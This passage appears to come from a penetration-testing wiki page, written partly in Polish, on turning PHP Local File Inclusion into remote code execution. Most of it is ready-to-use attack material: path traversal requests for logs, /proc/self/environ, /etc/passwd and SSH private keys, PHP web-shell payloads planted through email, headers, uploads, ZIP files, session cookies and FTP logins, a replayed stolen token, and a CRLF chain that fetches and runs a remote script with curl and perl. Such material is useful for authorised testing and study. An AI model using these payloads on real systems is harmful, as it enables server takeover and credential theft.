GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Zdekoduj ciało, jeśli jest Base64, a następnie odtwórz przechwycony token:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Notatki:
- Tokeny w URLach są domyślnie logowane; nigdy nie akceptuj bearer tokens przez GET w systemach produkcyjnych.
- Jeśli aplikacja obsługuje wiele nazw tokenów, szukaj typowych kluczy takich jak AuthenticationToken, token, sid, access_token.
- Rotuj wszystkie tokeny, które mogły zostać leaked w logach.

### Przez e-mail

**Wyślij maila** na wewnętrzne konto (user@localhost) zawierającego Twój PHP payload jak `<?php echo system($_REQUEST["cmd"]); ?>` i spróbuj include'ować plik z maila użytkownika ze ścieżką taką jak **`/var/mail/<USERNAME>`** lub **`/var/spool/mail/<USERNAME>`**

### Przez /proc/*/fd/*

1. Wgraj wiele shells (na przykład: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), gdzie $PID = PID procesu (może być brute forced) a $FD = deskryptor pliku (też może być brute forced)

### Przez /proc/self/environ

Podobnie jak plik logu, wyślij payload w nagłówku User-Agent — zostanie on odzwierciedlony w pliku /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Przez przesłanie

Jeśli możesz przesłać plik, po prostu wstrzyknij w niego shell payload (e.g : `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Aby plik był czytelny, najlepiej wstrzyknąć to do metadanych obrazów/dokumentów/PDF

### Przez przesłanie pliku ZIP

Prześlij plik ZIP zawierający skompresowany PHP shell i uzyskaj do niego dostęp:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Przez sesje PHP

Sprawdź, czy strona używa sesji PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
W PHP te sesje są przechowywane w plikach _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Ustaw cookie na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Użyj LFI, aby dołączyć plik sesji PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Przez ssh

Jeśli ssh jest aktywne, sprawdź, który użytkownik jest używany (/proc/self/status & /etc/passwd) i spróbuj uzyskać dostęp do **\<HOME>/.ssh/id_rsa**

### **Przez** **vsftpd** _**logs**_

Logi serwera FTP vsftpd znajdują się w _**/var/log/vsftpd.log**_. W scenariuszu, gdzie istnieje podatność Local File Inclusion (LFI) i możliwy jest dostęp do wystawionego serwera vsftpd, można rozważyć następujące kroki:

1. Wstrzyknij PHP payload do pola username podczas procesu logowania.
2. Po wstrzyknięciu użyj LFI, aby pobrać logi serwera z _**/var/log/vsftpd.log**_.

### Przez php base64 filter (using base64)

As shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter just ignore Non-base64. Możesz tego użyć, aby obejść sprawdzanie rozszerzenia pliku: jeśli dostarczysz base64, które kończy się na ".php", filtr zignoruje "." i dopisze "php" do base64. Oto przykładowy payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explains that you can use **php filters to generate arbitrary content** as output. Which basically means that you can **generate arbitrary php code** for the include **without needing to write** it into a file.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

Prześlij plik, który zostanie zapisany tymczasowo w `/tmp`, następnie w tym samym żądaniu wywołaj **segmentation fault**, w wyniku czego tymczasowy plik nie zostanie usunięty i będziesz mógł go odnaleźć.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Jeśli znalazłeś **Local File Inclusion** i **Nginx** działa przed PHP, możesz uzyskać RCE przy użyciu następującej techniki:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

Jeśli znalazłeś **Local File Inclusion**, nawet gdy **nie masz sesji** i `session.auto_start` jest `Off`. Jeśli dostarczysz **`PHP_SESSION_UPLOAD_PROGRESS`** w danych **multipart POST**, PHP włączy sesję za Ciebie. Możesz to wykorzystać do uzyskania RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Jeśli znalazłeś **Local File Inclusion**, a serwer działa na **Windows**, możesz uzyskać RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Poniższe wykorzystuje CRLF vuln do uzyskania RCE (z [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

Jeśli znalazłeś **Local File Inclusion** i plik ujawniający **phpinfo()** z file_uploads = on, możesz uzyskać RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Jeśli znalazłeś **Local File Inclusion** i **can exfiltrate the path** of the temp file, ALE **serwer** jest **checking** czy **file to be included has PHP marks**, możesz spróbować **bypass that check** z użyciem tej **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

Jeśli możesz nadużyć LFI, aby **upload temporary files** i sprawić, że **serwer** **hang** wykonanie PHP, możesz następnie **brute force filenames during hours**, aby znaleźć plik tymczasowy:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

Jeśli dołączysz którykolwiek z plików `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Musisz dołączyć ten sam plik 2 time, aby wywołać ten błąd).

Nie wiem, jak to może być przydatne, ale może.\
_Nawet jeśli spowodujesz PHP Fatal Error, przesłane tymczasowe pliki PHP zostaną usunięte._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


### Preserve traversal sequences from the client

Niektórzy klienci HTTP normalizują lub redukują `../` zanim żądanie dotrze do serwera, co psuje directory traversal payloads. Użyj `curl --path-as-is`, aby zachować traversal nietknięte podczas nadużywania log/download endpointów, które łączą nazwę pliku kontrolowaną przez użytkownika, oraz dodaj `--ignore-content-length` dla pseudo-plików takich jak `/proc`:
```bash
curl --path-as-is -b "session=$SESSION" \
"http://TARGET/admin/get_system_log?log_identifier=../../../../proc/self/environ" \
--ignore-content-length -s | tr '\000' '\n'
```
Dopasuj liczbę segmentów `../`, aż wydostaniesz się poza zamierzony katalog, a następnie odczytaj `/etc/passwd`, `/proc/self/cwd/app.py` lub inne pliki źródłowe/konfiguracyjne.

## Źródła

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [HTB: Imagery (admin log download traversal + `/proc/self/environ` read)](https://0xdf.gitlab.io/2026/01/24/htb-imagery.html)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
